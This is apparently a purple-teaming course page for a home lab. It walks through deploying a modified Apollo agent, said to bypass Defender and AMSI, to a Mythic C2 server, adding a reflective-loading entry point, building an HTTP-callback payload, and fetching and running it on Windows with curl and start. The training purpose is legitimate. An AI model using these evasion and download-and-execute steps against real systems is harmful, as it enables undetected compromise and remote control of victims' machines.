---
layout: default
title: "Moving Tuned Apollo Agent to Mythic Server"
permalink: /solo-purple-teaming/moving-tuned-apollo-agent-to-mythic-server/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Moving Tuned Apollo Agent to Mythic Server</h1>
</section>
<section class="spt-content">

Owner: Mike Sterrett

### 🎯 Objective

Move your modified Apollo agent code (tuned to bypass Defender and AMSI) from your Windows 11 reverse engineering VM to the Kali box hosting Mythic, and verify that the payload builds and functions correctly.

---

### 🧱 Prerequisites

- Mythic installed and running on a Kali box
- A working, modified Apollo agent on your Windows machine
- SSH/SCP access from Windows to Kali
- Python3 installed for HTTP serving

---

## Step 1: Clean Up Windows Workspace

1. Navigate to your Windows desktop and remove any non-research files.
2. Empty your trash to avoid clutter outside your research directory.

---

## Step 2: Prepare Modified Agent Code

1. Navigate to the modified agent directory:
    
    ```
    C:\...\research\Apollo-Master\Apollo-Master\Payload_Types\Apollo\Apollo\Agent_Code
    
    ```
    
2. Copy the **Agent_Code** folder to your top-level `research` folder.

![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image.png)

1. Compress the copied folder:
    - Right-click → “Compress to ZIP file”
    
    ![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%201.png)
    
    - Name it: `agent_code.zip`

---

## Step 3: Transfer Code to Kali with SCP

1. Open a terminal (on your Windows machine).
2. Use SCP to transfer the ZIP file to your Kali box:
    
    ```bash
    bash
    scp agent_code.zip username@10.0.3.2:~/
    
    ```
    

![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%202.png)

1. Authenticate if prompted.

---

## Step 4: Replace Apollo Agent Code in Mythic

1. SSH into your Kali box:
    
    ```bash
    ssh username@10.0.3.2
    
    ```
    
2. Move the ZIP file to the Apollo agent directory:
    
    ```bash
    sudo mv ~/agent_code.zip /opt/mythic/mythic/installed_services/Apollo/Apollo/
    
    ```
    
3. Navigate to the directory:
    
    ```bash
    cd /opt/mythic/mythic/installed_services/Apollo/Apollo/
    
    ```
    
4. Remove the old agent code:
    
    ```bash
    sudo rm -rf agent_code
    
    ```
    
5. Unzip the new agent code:
    
    ```bash
    sudo unzip agent_code.zip
    
    ```
    
6. Set permissions:
    
    ```bash
    sudo chmod -R 755 agent_code
    
    ```
    

---

## Step 5: Add the `Execute` Method for Reflective Loading

1. Navigate to `Program.cs` inside the new agent code:
    
    ```bash
    cd agent_code/Apollo/
    sudo vi Program.cs
    
    ```
    
2. Add the following method before the `Main` method:
    
    ```csharp
    public static void Execute()
    {
        string[] args = {};
        Main(args);
    }
    
    ```
    

![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%203.png)

1. Save and exit (`ESC` → `:wq`)

---

## Step 6: Restart Mythic

1. Go to Mythic root:
    
    ```bash
    cd /opt/mythic/mythic
    
    ```
    
2. Restart the Mythic server:
    
    ```bash
    sudo ./mythic-cli stop
    sudo ./mythic-cli start
    
    ```
    

---

## Step 7: Build a New Payload in Mythic

1. In your browser, go to `https://localhost:7443` and log in to Mythic.
2. Delete the old payload from the UI if present.

![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%204.png)

1. Click **Actions → Generate New Payload**
2. Select:
    - **Payload Type:** Apollo
    - **Format:** Windows → `.exe`
    - **Listener:** HTTP
    - **Callback Host:** `10.0.3.2`
3. Name it something like `Apollo_custom.exe`
4. Click **Create Payload**
5. Confirm successful build (no errors). Download the payload.

---

## Step 8: Host the Payload with Python

1. Transfer the payload to your Kali box:
    
    ```bash
    scp Apollo_custom.exe username@192.168.x.x:~/Downloads
    
    ```
    
2. SSH into Kali and serve the payload:
    
    ```bash
    ssh username@192.168.x.x
    cd Downloads
    python3 -m http.server 8000
    
    ```
    

---

## Step 9: Execute the Payload on Windows

1. On your Windows 11 VM, open a terminal.
2. Download and run the payload:
    
    ```bash
    curl http://192.168.x.x:8000/Apollo_custom.exe -o Apollo.exe
    start Apollo.exe
    
    ```
    

---

## Step 10: Verify Callback and Interaction

1. In Mythic, check the **Callbacks** tab for a new agent.
2. Click the callback to interact with the agent.
3. Test basic commands:
    - Load the module:
        
        ```
        load whoami
        
        ```
        
    
    ![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%205.png)
    
    - Run:
        
        ```
        whoami
        
        ```
        
    
    ![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%206.png)
    
    Output should confirm you're operating under your Windows user context (e.g., `reverseengineer`).
    
    ![image.png](Moving%20Tuned%20Apollo%20Agent%20to%20Mythic%20Server/image%207.png)
    

---

## Step 11: Confirm Defender and AMSI Bypass

1. On the Windows VM:
    - Go to **Windows Security → Virus & threat protection**
    - Ensure **Real-time protection** is **ON**
2. Confirm that the payload executed and communicated without triggering Defender.

---

## ✅ Final Checkpoint

Before moving on:

- ✅ You must have a **working Apollo payload** that bypasses both **Defender** and **AMSI**
- ❌ If it's still flagged or fails to run — **do not proceed**
- 🛠️ Troubleshoot until your agent works as expected

---

## 🎯 Challenge

This step is **mandatory** for continuing the course. No fixes will be provided — solving this is part of your hands-on experience.

</section>
</div>
